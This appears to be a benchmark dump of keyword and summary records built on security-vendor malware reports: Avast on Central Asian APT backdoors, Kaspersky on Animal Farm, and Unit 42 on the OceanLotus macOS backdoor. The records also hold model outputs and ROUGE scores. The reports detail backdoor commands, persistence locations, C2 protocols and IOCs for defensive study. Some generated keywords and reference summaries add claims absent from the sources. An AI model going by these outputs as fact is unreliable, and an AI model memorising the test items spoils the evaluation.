Alto Networks, and Check Point, respectively. The backdoors we found are custom tools that have not previously been analyzed, as far as we know. The majority of the C&C servers are registered to Choopa, LLC, a hosting platform that has been used by cybercriminals in the past. A GoDaddy registrar was also seen early in the campaign, these servers were removed early on.We suspect the APT group behind these attacks is from China. Gh0st RAT, one of the tools used, has been known to be used by Chinese APT groups in the past. Similarities in the code used in the Vicious Panda campaign, (TTPS, especially the use of the RTF Weaponizer in the infection vector), which is also thought to have come from China, and the code we analyzed, also lead us to believe the group might be from China. The targeted companies and institutions, as well as the professional coding point to an APT group. ToolsetBackdoorsurl\ufb01le-networks-in-central-asia/2/95/15/2020APT Group Planted Backdoors Targeting High Pro\ufb01le Networks in Central Asia - Avast Threat LabsThroughout our analysis, we stumbled upon the following backdoors. Details on these backdoors C&C server 104.194.215[.]194pcaudit.bat1395B863AE5697EA5096F4E2EBEF54FC20D5380B6921F8835D1F030F2BA16A40Technical details (pcaudit.bat) pcaudit.bat is a batch \ufb01le that is used to invoke the svchost.exe in order to load the DLL \ufb01le for a given service speci\ufb01ed in the registry. This batch \ufb01le is responsible for the backdoor\u2019s persistence. The contents of the pcaudit.bat script can be found below:Figure 2: The batch \ufb01le that is responsible for the backdoor\u2019s persistenceTechnical details (sqllauncher.dll, logon.dll) Both DLLs, sqllauncher.dll and logon.dll, are primarily used as backdoors. These are installed as services by the aforementioned batch \ufb01le. They both create a log \ufb01le under the path: %COMMON_DOCUMENT%\\WZ9JuN00.tmp aggregating errors during the backdoor\u2019s runtime. Each entry contains an error code, an error message, and a timestamp formatted as \u201c[yyyy-mm- dd hh-mm-ss] %error code% %message%\u201d.If the infected device can\u2019t connect to the C&C server, the malware attempts to determine whether the traf\ufb01c is routed through a proxy. This information may be retrieved either from %WINDOWS%\\debug\\netlogon.cfg or from the TCP table. After successfully connecting to theurl\ufb01le-networks-in-central-asia/3/95/15/2020APT Group Planted Backdoors Targeting High Pro\ufb01le Networks in Central Asia - Avast Threat LabsC&C server, a secure communication channel (Schannel) is established and telemetry (OS version, username) is sent to the C&C server. The following commands are issued by the C&C WELCOMLIST DSTARTCUPLOADDOWNLOEXECUTSend malware version to the C&C Send all used drive let\u2010 ters to the C&C Start remote shell Execute \u201ccmd %com\u2010 mand%\u201d via CreatePro\u2010 cess API Read from %path% and send data to C&C Write %data% into via CreateProcess APICom\u2010 %command%J8AoctiB QHb\u2010 %command%Technical details (logsupport.dll) Similarly to the previous DLLs, the logsupport.dll is primarily used as a backdoor, but uses a different C&C server than the other backdoors. Its corresponding log \ufb01le is located at %TEMP%\\rar%[A-Z0-9]{4}%.tmp. The structure of the log \ufb01le is also the same. The main difference is that the log \ufb01le is encrypted by a XOR cipher with a hardcoded key.url\ufb01le-networks-in-central-asia/4/95/15/2020APT Group Planted Backdoors Targeting High Pro\ufb01le Networks in Central Asia - Avast Threat LabsFigure 3: Log \ufb01le is decrypted by a XOR cipher with a hardcoded keyThis backdoor checks whether the malware is running in a virtualized environment. Additionally, the DLL \ufb01ngerprints the infected device (NETBIOS name, IP address, username, OS version, MAC address and RAM usage, OEM code page, token information, number of CPU cores, is64bit), and sends this information to the C&C server.The communication with the C&C server is encrypted by a simple stream cipher. If the malware fails to establish an encrypted channel, it checks whether a proxy is being used, using different methods than the previous two DLLs. It tries to connect to url and retrieve information about a possible proxy from the connection, and it also checks the value of ProxyServer in the Windows registry key:HKLM\\Software\\Microsft\\Windows\\CurrentVersion\\Internet Settings.Based on what we saw in the code, the backdoor is also capable of accepting various commands from the C&C server. These commands allow the backdoor to manipulate \ufb01les (move, read, delete, check existence), manipulate processes (create, terminate, retrieve parent, and process ID) and Windows services (start, stop, check), execute console commands, remove itself, and more. Some of these commands (read/check \ufb01le, check services, check processes) also send data back to C&C. The infected device can also be commanded by C&C to act as a proxy or listen on a speci\ufb01c port on every network interface.Interestingly, the backdoor has a set of commands speci\ufb01cally targeting \ufb01les with .tu and .tut \ufb01le extension. These commands may similarly check for their existence, send their content back to the C&C, and modify their content (append or rewrite by data given by the C&C server). started in 2007. It is a robust tool that exploits various Windows authentication schemes and dumps credential-related data from a Windows Local Security Account database. For these reasons it is often misused by a wide spectrum of APT actors such as the Lazarus Group or Telebots.The Mimikatz version used in this campaign has a two-stage installation mechanism (installer.exe installing Yokel64.exe and mktz64.dll), and contains a PDB string \u201cE:\\2018_\\MimHash\\mimikatz\\Bin\\mktzx64.pdb\u201d. Calling a mktz64.dll exported function MktzDumpbyInjection inside our testing virtual machine yields the following output:#1 domain = MSEDGEWIN10, user = Administrator ,nthash=FC525C9683E8FE067095BA2DDC971889 #2 domain = MSEDGEWIN10, user = IEUser , uses the following format: \u201c@@<ComputerName>,<UserName>,<Password>,.exe\u201d. Afterwards, the data described in the \ufb01lename is extracted and used to establish a remote console to a computer identi\ufb01ed by the retrieved name. Afterwards, Windows Management Instrumentation (WMI) is leveraged to set a strict proxy security, leading to the encryption of arguments of each remote procedure call, and allowing the server to access local resources. Then WMI is used again to retrieve the Win32_Process class which in turn is used to create a process with given parameters. At the end, it terminates itself. Gh0st RAT is commonly assumed that its source code is widely available. Its presence is often indicated by a \ufb01le named rastls.dll, using an export DLL name svchost.dll and containing a string Gh0st. A string uwqixgze} is used as a placeholder for the C&C domain.The version we\u2019ve seen in this campaign tries to connect to url\ufb01le-networks-in-central-asia/6/95/15/2020APT Group Planted Backdoors Targeting High Pro\ufb01le Networks in Central Asia - Avast Threat LabsFigure 4: Gh0st RAT malwareCode Similarities While analyzing one of the \ufb01les, we noticed that it has several correlations to the Microcin sample from 2017, the BYEBY sample from 2017, and Vicious Panda: The COVID campaign from 2020. Figure 5 below provides a comparison of the decryption loop used to decrypt the main con\ufb01guration data of the \ufb01rst backdoor.Figure 5: Part of code used to decipher the main con\ufb01guration dataurl\ufb01le-networks-in-central-asia/7/95/15/2020APT Group Planted Backdoors Targeting High Pro\ufb01le Networks in Central Asia - Avast Threat LabsSHA256Name of \ufb01le irmon.dll 170008187EBCEF183E792513608B82572FAF0AAEB33212BFA44736439453218F Avast reported its \ufb01ndings to the local CERT team and reached out to the telecommunications company. We have not heard back from either organization.Avast has recently protected users in Central Asia from further attacks using the samples we analyzed. This, along with tying elements of the samples we discovered back to attacks carried out on other countries, makes me assume the group is still active.I would like to thank Peter Kalnai from ESET for working with me on the analysis, Luk\u00e1\u0161 Obrdl\u00edk, and Adolf St\u0159eda from Avast for helping me with this research, as well as Alexey Shulmin from Kaspersky for his support. Indicators of Compromise (IoC)Repository: url List of SHA-256: url Vasily Berdnikov, Dmitry Karasovsky, Alexey Shulmin: \u201cMicrocin malware\u201d, Kaspersky Labs 2017- 9-25 url content/uploads/sites/43/2018/03/07170759/Microcin_Technical_4PDF_eng_\ufb01nal_s.pdfJosh Grunzweig, Robert Falcone: \u201cThreat Actors Target Government of Belarus Using CMSTAR Trojan\u201d, Palo Alto Networks, September 2017, url actors-target-government-belarus-using-cmstar-trojan/Checkpoint Research: \u201cVicious Panda: The COVID Campaign\u201d, 2020-03-12 url Threat Intelligence url\ufb01le-networks-in-central-asia/8/95/15/2020APT Group Planted Backdoors Targeting High Pro\ufb01le Networks in Central Asia - Avast Threat LabsESET Threat Intelligence url Mahjoub, Jeremiah O\u2019Connor, Thibault Reuille, Thomas Mathew: \u201cPhishing, Spiking, and Bad Hosting\u201d, Cisco Umbrella Blog, 2015-09-14url\ufb01le-networks-in-central-asia/9/9 ", "generated_text": "Avast Threat Labs; Chinese; APT; groups; Central Asia; control; data; organizations; Mongolia; Russia; Belarus; Mimikatz; Gh0st RAT; AV detection; a large number; samples; VMProtect; analysis; the backdoors; processes; screenshots; control; C&C servers; Russian; Belarus; Mongolia; Russia; Mongolia; Russia; Belarus; The targeted companies; institutions; these backdoors; Mimikatz; Gh0st RAT; management instrumentation; the group; links; Microcin; Vicious Panda; TTPS; the code; the RTF Weaponizer; the Vicious Panda campaign; ATT&CK campaigns; the targeted networks.", "ref_text": "<START-1>The document describes an advanced persistent threat (APT) campaign targeting high-profile companies in Central Asia that was analyzed by Avast and ESET. The attackers planted backdoors to gain long-term access to corporate networks. The threat actors frequently recompiled their custom malware tools to avoid detection. The tools included backdoors, Mimikatz, and Gh0st RAT. Many samples were protected by VMProtect obfuscation. The backdoors gave the attackers capabilities to manipulate files, take screenshots, manipulate processes and services, execute commands, proxy network traffic, exfiltrate data, and more. Lateral movement within compromised networks was achieved using Mimikatz credential theft and Windows Management Instrumentation (WMI). Attribution points to an APT group possibly from China, based on code similarities with past campaigns like Vicious Panda, the use of Gh0st RAT, and the professional coding techniques. Most command and control servers were registered with Choopa LLC hosting. Avast and ESET detected and blocked the malware before this campaign was fully analyzed. The threat actors are suspected to still be active, as similar attacks were seen targeting Central Asia recently. <END-1>", "t5/keyword/hint_hit_precision": 0.2826086956521739, "t5/word/hint_hit_recall": 0.10465116279069768, "gpt3/lexical/rouge_rouge1": 0.5838509316770186, "gpt3/lexical/rouge_rouge2": 0.21875, "gpt3/lexical/rouge_rougeL": 0.2981366459627329, "gpt3/lexical/rouge_rougeLsum": 0.2981366459627329, "gpt3_generated_text": ["Avast Threat Labs recently detected APT groups targeting high-profile networks in Central Asia, possibly originating from China. These groups planted backdoors, including Mimikatz and Gh0st RAT, to gain long-term access to organizations in Mongolia, Russia, and Belarus. The backdoors allowed the actors to manipulate files, take screenshots, execute commands, and exfiltrate data to C&C servers. Analysis of the malware samples revealed similarities to known campaigns such as Microcin, BYEBY, and Vicious Panda, suggesting a Chinese origin. The targeted companies and institutions, along with the professional coding of the backdoors, point to the involvement of an APT group. The use of custom tools and evasion techniques, such as recompiling tools to avoid AV detection, made analysis challenging. The backdoors were linked to C&C servers hosted by Choopa, LLC, and GoDaddy registrar, indicating a coordinated effort by the APT group to infiltrate and control targeted networks."]}, {"split_name": "val", "sample_id": "val_18", "prompt_text": "Extract the keywords: Animals in the APT Farmsecurelist.com/animals-in-the-apt-farm/69114By GReATIn 2014, researchers at Kaspersky Lab discovered and reported on three zero-days that were being used in cyberattacks in the wild.Two of these zero-day vulnerabilities are associated with an advanced threat actor we call Animal Farm. Over the past few years, Animal Farm has targeted a wide range of global organizations. Victims include:Government organizations Military contractors Humanitarian aid organizations Private companies Journalists and media organizations ActivistsOur colleagues at Cyphort, G-DATA and ESET have recently published blogs about Bunny, Casper and Babar, some of the Trojans used by the Animal Farm group.The Farm includes several Trojans, which we have grouped into six major families:Here\u2019s a brief description of the animals in the farm:Bunny \u2013 an old \u201cvalidator\u201d-style Trojan used with a PDF zero-day attack in 2011.1/4Dino \u2013 a full-featured espionage platform. Babar \u2013 the most sophisticated espionage platform from the Animal Farm group. NBot \u2013 malware used in a botnet-style operation by the group. It has DDoS capabilities. Tafacalou \u2013 a validator-style Trojan used by the attackers in recent years. Confirmed victims get upgraded to Dino or Babar. Casper \u2013 the most recent \u201cvalidator\u201d-style implant from the Animal Farm group.The group has been active since at least 2009 and there are signs that earlier malware versions were developed as far back as 2007.Over the years we have tracked multiple campaigns by the Animal Farm group. These can be identified by a specific code found either in the malware configuration or extracted from the C&C logs.Most recently, the group deployed the Casper Trojan via a watering-hole attack in Syria. A full description of this zero-day attack can be found in this blog post by Kaspersky Lab\u2019s Vyacheslav Zakorzhevsky.In addition to these, the Animal Farm attackers used at least one unknown, mysterious malware during an operation targeting computer users in Burkina Faso.KSN & Sinkholing statistics During the investigation we sinkholed a large number of C&C servers used by the Animal Farm group. This allowed us to compile a comprehensive picture of both targets and victims.2/4The malware known as Tafacalou (aka \u201cTFC\u201d, \u201cTransporter\u201d) is perhaps of greatest interest here, because it acts as an entry point for the more sophisticated spy platforms Babar and Dino. Based on the Tafacalou infection logs, we observed that most of the victims are in the following countries: Syria, Iran, Malaysia, USA, China, Turkey, Netherlands, Germany, Great Britain, Russia, Sweden, Austria, Algeria, Israel, Iraq, Morocco, New Zealand, Ukraine.What does \u201cTafacalou\u201d mean? \u201cTafacalou\u201d is the attacker\u2019s internal name for one of the validator (1st stage) Trojans. We tried various spellings of this word to see if it means anything in a specific language, and the most interesting option is one with its origins in the Occitan language: \u201cTa Fa Calou.\u201dThe expression \u201cFa Calou\u201d is the French interpretation of the Occitane \u201cFa Calor\u201d which means \u201cit\u2019s getting hot\u201d (see url occitane-et-ses-quelques.html). \u2018Ta Fa Calou\u201d could therefore be taken to mean \u201cso it\u2019s getting hot\u201d based on the Occitan language.According to Wikipedia: \u2018Occitan is a Romance language spoken in southern France, Italy\u2019s Occitan Valleys, Monaco, and Spain\u2019s Val d\u2019Aran; collectively, these regions are sometimes referred to unofficially as \u201cOccitania\u201d.3/4Note: A detailed technical report on Animal Farm is available to customers of Kaspersky Intelligent Services. For more information, contact intelreports@kaspersky.com4/4 ", "generated_text": "Kaspersky; an advanced threat actor; Animal Farm; at least 2009; victims; organizations; government; military contractors; private companies; Journalists; media organizations; the malware; Tafacalou; TFC; Transporter; victims; Babar; Dino; Babar; Casper; the group; victims; Burkina Faso; a watering hole attack; the group; victims; victims; the malware; IP; data; a remote network; the network; a remote server; the victim; the victim; the zero-day; the group; Activists.", "ref_text": "<START-1>The document describes the activities of a sophisticated cyberespionage threat actor that Kaspersky Lab researchers have dubbed \"Animal Farm.\" Animal Farm has been active since at least 2009 and targets a wide range of organizations globally, including government agencies, military contractors, humanitarian groups, private companies, journalists, activists, and more. Animal Farm uses several custom malware families as part of its operations, which Kaspersky has categorized into 6 groups: Bunny, Dino, Babar, NBot, Tafacalou, and Casper. Each malware family has different capabilities and is deployed at different stages of Animal Farm's attacks. For example, Tafacalou is used as an initial infection vector to then deploy more advanced malware like Dino or Babar on high-value targets. By analyzing command and control server logs, Kaspersky has identified numerous Animal Farm victims, with concentrations in Syria, Iran, Malaysia, the US, China, Turkey, and various European countries. The name Tafacalou may derive from the Occitan language and mean \"so it's getting hot,\" suggesting the malware is heating up or escalating its attacks. Animal Farm has used at least 3 zero-day vulnerabilities over the years to distribute its malware, including via PDF and watering hole attacks. The group continues to evolve its tactics, techniques, and procedures. Kaspersky assesses with high confidence that Animal Farm operates on behalf of a nation-state sponsor based on its sophisticated capabilities and global targeting aligned with espionage objectives. Kaspersky did not attribute Animal Farm to a specific country in this report. In summary, Animal Farm is a highly capable, long-running cyberespionage actor that deploys multiple custom malware families and constantly innovates to compromise new targets globally, likely in support of a nation-state's intelligence requirements. Ongoing monitoring and research is required to track this advanced persistent threat.<END-1>", "t5/keyword/hint_hit_precision": 0.4473684210526316, "t5/word/hint_hit_recall": 0.08421052631578947, "gpt3/lexical/rouge_rouge1": 0.46902654867256643, "gpt3/lexical/rouge_rouge2": 0.15555555555555556, "gpt3/lexical/rouge_rougeL": 0.22123893805309736, "gpt3/lexical/rouge_rougeLsum": 0.22123893805309736, "gpt3_generated_text": ["The article discusses the activities of an advanced threat actor group known as Animal Farm, which has been targeting global organizations since at least 2009. The group has used various Trojans, including Bunny, Dino, Babar, NBot, Tafacalou, and Casper, to conduct espionage operations. Victims of Animal Farm include government organizations, military contractors, humanitarian aid organizations, private companies, journalists, media organizations, and activists. The Tafacalou malware acts as an entry point for more sophisticated spy platforms such as Babar and Dino. The group has been involved in various campaigns, with recent attacks including a watering hole attack in Syria and an operation targeting computer users in Burkina Faso. Sinkholing of C&C servers used by Animal Farm has provided insights into the group's targets and victims, with most victims located in countries such as Syria, Iran, Malaysia, USA, and China. The article also delves into the origins of the term \"Tafacalou\" and its potential meaning in the Occitan language."]}, {"split_name": "val", "sample_id": "val_19", "prompt_text": "Extract the keywords: MENUGet Support | English [change]Blog Home > Unit 42 > The New and Improved macOS Backdoor from OceanLotusThe OceanLotusBy Erye Hernandez and Danny Tsechansky June 22, 2017 at 10:00 AM Category: Unit 42 Tags: backdoor, macOS, OceanLotus, threat intelligence1,759(2)Introduction Recently, we discovered a new version of the OceanLotus backdoor in our WildFire cloud analysis platform which may be one of the more advanced backdoors we have seen on macOS to date. This iteration is targeted towards victims in Vietnam and still maintains extremely low AV detection almost a year after it was \ufb01rst discovered. Despite having been in the wild for an extended period of time, the operation appears to still be active. During our  analysis, we were able communicate directly with the command and control server as recently as early June 2017. While there seem to be similarities to an OceanLotus sample discovered in May 2015, a variety of improvements have been made since then. Some of the improvements include the use of a decoy document, elimination of the use of command line utilities, a robust string encoding mechanism, custom binary protocol tra\ufb03c with encryption, and a modularized backdoor.   The new OceanLotus backdoor is distributed in a zip \ufb01le. While we don\u2019t have direct evidence for the initial infection vector we presume it\u2019s most likely  via an email attachment. Once the user has extracted the zip \ufb01le, they see a directory containing a \ufb01le with a Microsoft Word document icon. The \ufb01le is    actually an application bundle, which contains executable code. (see Figure 1). Once the user double clicks on the purported Word document, the Trojan executes and then launches Word to display a decoy document. The malware uses the decoy document to help mask the execution of the malware. This technique is a common one for Windows-based malware, but rare on macOS. In order to achieve this layer of obfuscation, the malware author had to trick the operating system into believing the folder is an application bundle despite the .docx extension. Traditionally, macOS malware have emulated legitimate application installers such as Adobe Flash, which was how the previous version of OceanLotus was packaged.Figure Once the application bundle is launched, it opens a hidden \ufb01le in the bundle\u2019s Resources folder named .CFUserEncoding which is a password-protected  Word document (see Figure 2). It also copies this \ufb01le to the executable path and essentially replaces the application bundle after persistence has been  set up. This would lead the victim to believe that nothing was amiss, as they thought they were opening a Word document and a Word document opened. In this case, the Word \ufb01le has the name \u201cNoi dung chi tiet.docx\u201d, which is Vietnamese for \u201cDetails.\u201d Figure Compared to the previous version of this backdoor, the persistence mechanism for this remained largely the same. This version creates a Launch Agent that runs when the victim host starts up, where as in the previous version execution was upon when a user logs in. It also copies itself to a di\ufb00erent  location and \ufb01lename based on the UID of the user who ran the application.  For a user other than root, it takes the MD5 hash of the structure returned by getpwuid() and breaks the hash down into segments <\ufb01rst of hash>-<next hash>. This segmented MD5 hash is prepended with \u201c0000-\u201c then used as a directory in ~/Library/OpenSSL/ to store the executable \ufb01le (see Figure 3). If the user is root, the executable is stored in the system wide library directory at  /Library/TimeMachine/bin/mtmfs. It is interesting to note that the executable and plist locations look like legitimate applications. /Library/LaunchDaemons/com.apple.mtmfsd.plist ~/Library/LaunchAgents/com.apple.openssl.plistExecutable Location /Library/TimeMachine/bin/mtmfs ~/Library/OpenSSL/0000-<segmented MD5 Once the malware has set up persistence, it deletes the application bundle from the executable path leaving the decoy document in its place and launches itself as a service from the new location. No Command Line Utilities One of the \ufb01rst things we noticed about this backdoor is the lack of suspicious strings which often times provides context as to what the malware might  do on a victim host. In most macOS malware, calls to the system() or exec() functions to run additional scripts are in place. In this case, these were not present nor were there command line utility strings that may easily convey the malicious intention of the application. This shows a deep level of understanding of the macOS platform by the author of this backdoor compared to other threat actors that will commonly copy and paste scripts from the Internet. The lack of these strings may also double as an anti-analysis technique to make the malware seem less suspicious, especially to basic static analysis. String Decoding Since there appear to be no obvious suspicious strings in plaintext, we move onto the possibility of use of encoded, or obfuscated strings. The string decode routine for this backdoor is an upgrade from previous versions in which strings were XOR encoded with the word \u201cVariable\u201d as a key. The string decode routine now consists of a combination of bit shifting and XOR operations with a variable key that depends on the length of the string that was encoded. If the computation for the variable XOR key turns out to be 0, the default XOR key of 0x1B is used. Figure 4 shows a Python implementation of the decode function.Figure After decoding the strings (see Figure 5), we can glean that the malware sets up persistence, surveys the victim\u2019s computer, and sends this information back to a server. At this point, it is still not obvious that this malware contains backdoor functionality.Figure Custom Binary Protocol and Encrypted Tra\ufb03c   The threat actors responsible for this malware appear to have spent some amount of e\ufb00ort to develop their own custom communication protocol. They  did not simply use an o\ufb00-the-shelf web server for their command and control server, as is commonly done. Instead, they created their own command  and control mechanism. The backdoor uses a custom binary protocol on TCP port 443, a well-known port that is unlikely to be blocked by traditional \ufb01rewalls due to its use in  HTTPS connections. The packet seen in Figure 6 is encoded with a combination of bit shifting (see Figure 7) and XOR with a key of 0x1B before it is sent. The bits are always rotated to the left 3 times before doing the XOR operation. This is an improvement from the previous version where the packet was only XOR encoded with a key of 0x1B.Figure After decoding the packet, we can see a breakdown of di\ufb00erent \ufb01elds. Figure 8 shows the initial packet sent by the client to the server. It is relatively   empty aside from the \u201cmagic\u201d bytes, length of data and type of communication.Figure Depending on the command response sent from the server, a packet may be bigger than 0x52 bytes. Data beyond 0x52 bytes is zlib compressed then encrypted with AES in CBC mode with a null initialization vector (IV) and a key sent from the server that is padded to 32 bytes. We captured live tra\ufb03c from the server, and observed that the encryption keys sent from the server are ephemeral. This means that each new session   with the server is given a di\ufb00erent key used to encrypt data sent back and forth within that session. This is a marked improvement compared to the  previous version, where only XOR encoding with a one-byte key was used for encryption. After decoding the packet it receives from the server, the backdoor validates certain \ufb01elds like the \u201cmagic\u201d bytes and makes sure the length of the data  being received is not over a certain amount. Throughout the program execution, it also checks and handles any errors that may have been generated. Command and Control Communications The command and control server communication sequence is as follows:1. The client initiates a session with the server by sending a packet with 0x2170272 in the command \ufb01eld.  2. The server then responds with an ephemeral encryption key and a command. 3. The client checks if the received packet from the server is valid. 4. The client executes the command sent by the server and responds with a zlib compressed and AES encrypted blob of the result then sends thisback to the server.Unlike the previous versions of OceanLotus where the commands can be easily gathered from its strings, the author has obfuscated the functions with constant values. We decoded the following available commands as seen in Figure 9. When the backdoor is launched, a \ufb01le is created in  /Library/Preferences/.\ufb01les  or ~/Library/Preferences/.\ufb01les  depending on the victim\u2019s user ID. This \ufb01le  (see Figure 10) contains a timestamp and the victim\u2019s name concatenated with the machine\u2019s serial number which is then hashed twice with MD5. This is then copied to a bu\ufb00er that is 0x110 bytes long and AES encrypted in CBC mode with a null IV and a key of  \u201cpth\u201d. It is then saved into the \ufb01le. Command receive \ufb01le from server  get info on a \ufb01le / directory  delete \ufb01le / directory  ??? execute function from a dynamic library send \ufb01le to server  ??? send victim and computer information together with the backdoor\u2019s watermark execute a function from a dynamic library execute a function from a dynamic libraryTimestamp + MD5(MD5(<victim\u2019s name + machine serial number>))After this \ufb01le is created, the client sends its \ufb01rst packet to the server with 0x2170272 in the command \ufb01eld. The server acknowledges and responds with    the same command and the client veri\ufb01es that the \ufb01le has been created.  \\xa7\\xf1\\xd9*\\x82\\xc8\\xd8\\xfe4137674062B3226FE630C24F7DE1021E\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ~/Library/Preferences/.\ufb01les  The server then sends this command with an ephemeral key shortly after it sends the 0x2170272 command. The client gathers all the data seen in Figure 11, encrypts it with the key provided by the server and sends it back. One thing to note is the Base64 string that is sent in this packet. This string is static in the binary and does not change, which may be indicative of a marker for campaign or version identi\ufb01cation.  \\x00\\x00\\x004137674062B3226FE630C24F7DE1021E\\xe9\\x0f\\x00\\x00\\x00Mac 10.X.X\\xb6\\x03\\x00\\x00 \\x00username\\t\\x00\\x00\\x00localhost\\x18\\x00\\x00\\x00Ze0pXcpfbqbS4wD0eS/LVQ==\\xb6\\xbc\\x1cY\\x00\\x00\\x00\\x00M\\x00\\x00\\x00/Users/username/Library/OpenSSL/0000- ABCDEF01-23456789ABCDEF01-23456789/ servicessl\\x8b\\xbc\\x1cY\\x00\\x00\\x00\\x00\\x17\\x00\\x00\\x00en0 : AA:BB:CC:DD:EE:FF[\\x00\\x00\\x00lo0 : fe80::1\\nlo0 : fe80::aaaa:bbbb:cccc:111 : \\x05\\x01\\x00\\x00f\\x00\\x00\\x00Model ID:iMac8,1\\nCPU:Intel(R) Core(TM)2 2.40GHz\\nMemory:4.00\\nSerial No:XXXXXXXXXXX\\x00\\x00\\x00\\x00 Not highlighted in Figure 11 but also included in this packet is the kernel boot time which may be used by the C2 server to help determine if the backdoor is being run in a sandbox environment. These commands load a dynamic library using dlopen() and obtains a function pointer to execute within that shared library using dlsym(). Unfortunately, we do not know which dynamic libraries or functions are used for each command since these are server supplied and we were not able to capture any communication that used these commands. However, we can postulate that since the parameters to the functions have the same number of arguments with the \ufb01rst being a fairly large constant  similar to the command constants, (see Figure 12) and the backdoor has a function for receiving \ufb01les, it is possible that these functions correspond to a  shared library that the server uploads to the victim host. This means that additional functionality can be added to this backdoor by loading modules directly from the C2 server.Figure Most macOS malware in the wild today are not very complex, but threat actors have been quickly improving their tradecraft. The increased level of sophistication and complexity may be indicative of increased targeting of macOS hosts looking to the future. With this OceanLotus attack in combination with recent macOS versions of the Sofacy group\u2019s toolset, we have now observed multiple espionage motivated threat actors targeting macOS. It is imperative that the same types of strong security practices and policies organizations use to defend Windows devices are applied universally to include macOS devices as well. Apple has already updated the macOS protection systems to address this variant of OceanLotus. Palo Alto Networks customers are protected and may learn more via the following:Samples are classi\ufb01ed as malicious by WildFire  Domains and IPs have been classi\ufb01ed as malicious and IPS signatures generated  AutoFocus users may learn more via the OceanLotus tagIndicators of Compromise Hashes call[.]raidstore[.]org technology[.]macosevents[.]com press[.]infomapress[.]com 24h[.]centralstatus[.]net /Library/LaunchDaemons/com.apple.mtmfsd.plist /Library/TimeMachine/bin/mtmfs /Library/Preferences/.\ufb01les UID ~/Library/LaunchAgents/com.apple.openssl.plist ~/Library/OpenSSL/0000-<segmented MD5 hash>/servicessl ~/Library/Preferences/.\ufb01les Got something to say?Leave a comment Notify e-mailName (required)Email (required)WebsiteSUBMITSUBSCRIBE TO NEWSLETTERSEmailCOMPANY Report a VulnerabilityLEGAL NOTICES Privacy Policy Terms of UseACCOUNT Manage SubscriptionSUBSCRIBE\u00a9 2016 Palo Alto Networks, Inc. All rights reserved.SALES > 866.320.4788SEE A DEMOTAKE A TEST DRIVE ", "generated_text": "the OceanLotus backdoor; Vietnamese; the malware; a zip file; the user; the malware; a decoy document; persistence; the decoy document; a binary protocol traffic; encryption; a modularized backdoor; the user; the user; persistence; the backdoor; ports; multiple servers; the command; control; the command; a decoy document; multiple screenshots; the user; commands; encryption; the operational environment; a backdoor; analysis; the version; the environment variables; the compromised environment variables; the user; the infrastructure; the backdoor application bundle; the command and control server.", "ref_text": "<START-1>The document describes a new backdoor malware called OceanLotus that has been found targeting MacOS devices, primarily in Vietnam. OceanLotus is an advanced and sophisticated piece of malware that has improved over previous versions in several ways: It uses a decoy Word document to disguise itself when executed. This tricks the user into thinking they opened a normal document. It establishes persistence in a clever way, storing itself in locations that mimic real MacOS applications and processes. This helps it blend in and avoid detection. It does not use suspicious command line utilities, making static analysis more difficult. It uses a custom encrypted network protocol to communicate with its command and control server, not standard web protocols. The encryption keys change per session. It can receive additional modules from the server, expanding its functionality dynamically. It exfiltrates system information from the infected machine back to the server, including username, network information, model details, etc. The authors appear to be espionage motivated and targeting MacOS specifically as it becomes more widely used. The malware continues to avoid detection very successfully. The report concludes that MacOS is increasingly being targeted and strong security practices need to be applied to it like other platforms. Defenses have been updated to detect this threat. <END-1>", "t5/keyword/hint_hit_precision": 0.16666666666666666, "t5/word/hint_hit_recall": 0.03827751196172249, "gpt3/lexical/rouge_rouge1": 0.37060702875399365, "gpt3/lexical/rouge_rouge2": 0.09646302250803858, "gpt3/lexical/rouge_rougeL": 0.18530351437699683, "gpt3/lexical/rouge_rougeLsum": 0.18530351437699683, "gpt3_generated_text": ["The article discusses the discovery of a new and advanced version of the OceanLotus backdoor targeting victims in Vietnam. The malware is distributed in a zip file, disguised as a Microsoft Word document, and utilizes a decoy document to mask its execution. It employs a robust string encoding mechanism, custom binary protocol traffic with encryption, and a modularized structure. The malware establishes persistence through a Launch Agent that runs at startup and stores itself in hidden directories based on the user's UID. The backdoor communicates with a command and control server and remains active, demonstrating sophisticated evasion techniques and a complex operational environment."]}, {"split_name": "val", "sample_id": "val_20", "prompt_text": "Extract the keywords: SHELLTEA + POSLURP MALWARE MEMORY-RESIDENT POINT-OF-SALE MALWARE ATTACKS INDUSTRYROOT9B JUNE 2017TABLE OF CONTENTSMEMORY-RESIDENT POINT-OF-SALE MALWAREATTACK OVERVIEWSHELLTEA MEMORY RESIDENT MALWARE (C2)MALWARE ANALYSIS: PoSLURP MALWAREMITIGATION RECOMMENDATIONSINDICATORS OF COMPROMISE (IOCs)TOOLS349172223232MEMORY-RESIDENT POINT-OF-SALE MALWARERetail Point-of-Sale (PoS) systems remain a top target for the financially-motivated hacker. Theft of payment card data in large volume exists not only as its own segment within financial crime, but also serves to facilitate 